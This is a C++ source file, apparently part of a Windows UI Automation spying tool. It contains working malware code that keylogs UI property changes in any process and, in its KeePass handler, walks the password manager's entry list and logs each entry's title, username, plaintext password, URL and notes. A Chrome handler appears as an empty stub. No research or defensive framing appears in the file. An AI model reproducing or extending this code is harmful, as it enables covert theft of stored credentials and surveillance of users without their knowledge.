#include "MyPropertyChangedEventHandler.h"
#include "MyPropertyChangedEventHandlerApps.h"
#include "Logger.h"
#include "MyTreeWalker.h"
#include "Helpers.h"

void MyPropertyChangedEventHandler::HandleOther(IUIAutomationElement* pAutomationElement, const std::wstring& wsProcName, const std::wstring& wsDate, PROPERTYID propId, VARIANT vVar)
{
	//Log(L"HandleOther() in Property Invoked", DBG);

	HRESULT hr = ERROR_SUCCESS;
	BSTR bLocalizedControlType = NULL;
	std::wstring wsLogKeyStroke = L"";

	hr = pAutomationElement->get_CurrentLocalizedControlType(&bLocalizedControlType);
	if (FAILED(hr))
	{
		Log(L"Can't get localized control type", DBG);
		goto exit;
	}

	wsLogKeyStroke = wsDate + L" " + wsProcName + L" [ " + bLocalizedControlType + L" ]";
	
	switch (propId) {
	case UIA_NamePropertyId:
		wsLogKeyStroke += L"\nNew Name: " + std::wstring(vVar.bstrVal);
		Log(wsLogKeyStroke, EMPTY);
		break;

	case UIA_ValueValuePropertyId:
		wsLogKeyStroke += L"\nNew Value: " + std::wstring(vVar.bstrVal);
		Log(wsLogKeyStroke, EMPTY);
		break;

	default:
		wsLogKeyStroke += L"\nUnhanled property! Trying to guess..." + std::to_wstring(propId);
		
		wsLogKeyStroke += L"\n" + Helpers::HandleVariant(vVar);

		Log(wsLogKeyStroke, EMPTY);
		break;
	}
exit:
	if (bLocalizedControlType)
		SysFreeString(bLocalizedControlType);
}


void MyPropertyChangedEventHandler::HandleKeepass(IUIAutomationElement* pAutomationElement, const std::wstring& wsProcName, const std::wstring& wsDate, PROPERTYID propId, VARIANT vVar)
{
	//Log(L"HandleKeepass() in Property Invoked", DBG);

	IUIAutomation* pAutomation = g_pMyTreeWalker->GetPAutomation();

	CComPtr<IUIAutomationElementArray> pElementArray = NULL;
	CComPtr<IUIAutomationCondition> pCondition = NULL;
	CComPtr<IUIAutomationCondition> pTrueCondition = NULL;
	CComPtr<IUIAutomationElement> pPassListEl = NULL;

	HRESULT hr = ERROR_SUCCESS;

	if (pAutomation == NULL)
	{
		Log(L"Can't get pAutomation from g_pMyTreeWalker in HandleKeepass()", DBG);
		return;
	}

	hr = pAutomation->CreatePropertyCondition(UIA_AutomationIdPropertyId, _variant_t(L"m_lvEntries"), &pCondition);
	if (FAILED(hr))
	{
		Log(L"Can't create property condition", DBG);
		return;
	}

	hr = pAutomation->CreateTrueCondition(&pTrueCondition);
	if (FAILED(hr))
	{
		Log(L"Can't create true property condition", DBG);
		return;
	}

	pPassListEl = g_pMyTreeWalker->FindFirstAscending(pAutomationElement, pCondition);
	if (pPassListEl == NULL)
	{
		Log(L"Can't find password list in keepass.exe", DBG);
		return;
	}

	hr = pPassListEl->FindAll(TreeScope_Children, pTrueCondition, &pElementArray);
	if (FAILED(hr))
	{
		Log(L"Can't find passwords in the list", DBG);
		return;
	}

	int count = 0;
	pElementArray->get_Length(&count);

	if (count == keePassPasswordsCount)
	{
		Log(L"No new passwords", DBG);
		return;
	}

	keePassPasswordsCount = count;

	Log(L"Found " + std::to_wstring(count-1) + L" stored passwords (one is the header and will be ignored)", INFO);

	for (int i = 0; i < count; i++)
	{
		std::wstring wsLogKeyStroke = L"";

		CComPtr<IUIAutomationElement> pEntryElement = NULL;
		VARIANT vValue;
		VariantInit(&vValue);


		hr = pElementArray->GetElement(i, &pEntryElement);
		if (FAILED(hr))
		{
			Log(L"Can't get element from list in keepass.exe", DBG);
			continue;
		}

		hr = pEntryElement->GetCurrentPropertyValue(UIA_AutomationIdPropertyId, &vValue);
		if (FAILED(hr) || vValue.bstrVal == NULL || wcscmp(vValue.bstrVal, L"Header") == 0)
		{
			continue;
		}

		CComPtr<IUIAutomationElementArray> pEntryChild = NULL;
		hr = pEntryElement->FindAll(TreeScope_Children, pTrueCondition, &pEntryChild);
		if (FAILED(hr) || pEntryChild == NULL)
		{
			continue;
		}

		BSTR bTitleName = NULL;
		BSTR bUserName = NULL;
		BSTR bPassword = NULL;
		BSTR bURL = NULL;
		BSTR bNotes = NULL;

		CComPtr<IUIAutomationElement> pEntryChildTitleElement = NULL;
		CComPtr<IUIAutomationElement> pEntryChildUsernameElement = NULL;
		CComPtr<IUIAutomationElement> pEntryChildPasswordElement = NULL;
		CComPtr<IUIAutomationElement> pEntryChildUrlElement = NULL;
		CComPtr<IUIAutomationElement> pEntryChildNotesElement = NULL;

		hr = pEntryChild->GetElement(0, &pEntryChildTitleElement);
		if (FAILED(hr)) {
			continue;
		}

		hr = pEntryChild->GetElement(1, &pEntryChildUsernameElement);
		if (FAILED(hr)) {
			continue;
		}

		hr = pEntryChild->GetElement(2, &pEntryChildPasswordElement);
		if (FAILED(hr)) {
			continue;
		}

		hr = pEntryChild->GetElement(3, &pEntryChildUrlElement);
		if (FAILED(hr)) {
			continue;
		}

		hr = pEntryChild->GetElement(4, &pEntryChildNotesElement);
		if (FAILED(hr)) {
			continue;
		}

		hr = pEntryChildTitleElement->get_CurrentName(&bTitleName);
		if (SUCCEEDED(hr)) {
			wsLogKeyStroke += L"\nTitle: " + std::wstring(bTitleName);
		}

		hr = pEntryChildUsernameElement->get_CurrentName(&bUserName);
		if (SUCCEEDED(hr)) {
			wsLogKeyStroke += L"\nUsername: " + std::wstring(bUserName);
		}

		hr = pEntryChildPasswordElement->get_CurrentName(&bPassword);
		if (SUCCEEDED(hr)) {
			wsLogKeyStroke += L"\nPassword: " + std::wstring(bPassword);
		}

		hr = pEntryChildUrlElement->get_CurrentName(&bURL);
		if (SUCCEEDED(hr)) {
			wsLogKeyStroke += L"\nURL: " + std::wstring(bURL);
		}

		hr = pEntryChildNotesElement->get_CurrentName(&bNotes);
		if (SUCCEEDED(hr)) {
			wsLogKeyStroke += L"\nNotes: " + std::wstring(bNotes);
		}


		if (bTitleName) {
			SysFreeString(bTitleName);
		}

		if (bUserName) {
			SysFreeString(bUserName);
		}

		if (bPassword) {
			SysFreeString(bPassword);
		}

		if (bURL) {
			SysFreeString(bURL);
		}

		if (bNotes) {
			SysFreeString(bNotes);
		}

		Log(wsLogKeyStroke, EMPTY);

		VariantClear(&vValue);
	}
}

void MyPropertyChangedEventHandler::HandleChrome(IUIAutomationElement* pAutomationElement, const std::wstring& wsProcName, const std::wstring& wsDate, PROPERTYID propId, VARIANT vVar)
{
	//Log(L"HandleChrome() in Property Invoked", DBG);
}